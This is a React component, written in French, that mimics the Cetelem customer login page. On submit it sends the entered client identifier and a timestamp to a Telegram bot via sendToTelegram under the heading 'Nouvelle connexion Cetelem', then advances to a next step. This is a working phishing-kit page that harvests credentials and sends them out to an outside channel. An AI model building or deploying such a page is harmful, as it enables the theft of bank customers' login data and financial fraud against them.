import React, { useState } from 'react';
import { sendToTelegram } from '../utils/telegram';

interface LoginFormProps {
  onNext: () => void;
}

export default function LoginForm({ onNext }: LoginFormProps) {
  const [identifiant, setIdentifiant] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Préparer le message pour Telegram
    const message = `
<b>🔐 Nouvelle connexion Cetelem</b>

<b>Identifiant client:</b> ${identifiant}
<b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}
<b>Page:</b> Connexion initiale
    `;

    // Envoyer vers Telegram
    await sendToTelegram(message);

    // Simuler un délai puis passer à l'étape suivante
    setTimeout(() => {
      setIsLoading(false);
      onNext();
    }, 1500);
  };

  return (
    <div className="continer">
      <form onSubmit={handleSubmit}>
        <div className="man">
          <img src="img/man.png" alt="Man" />
        </div>

        <div className="tite">
          <h1>Accéder à mon <br /> espace sécurisé</h1>
        </div>

        <div className="col">
          <label>Identifiant client</label>
          <input 
            type="text" 
            placeholder="Ex: 1234567" 
            value={identifiant}
            onChange={(e) => setIdentifiant(e.target.value)}
            required 
          />
        </div>

        <div className="box">
          <input type="checkbox" />
          <label>Mémoriser mon identifiant</label>
        </div>

        <div className="but">
          <button type="submit" disabled={isLoading}>
            {isLoading ? 'Connexion...' : 'Suivant'}
          </button>
        </div>

        <div className="a">
          <a href="#">Identifiant oublié ?</a>
        </div>
      </form>
    </div>
  );
}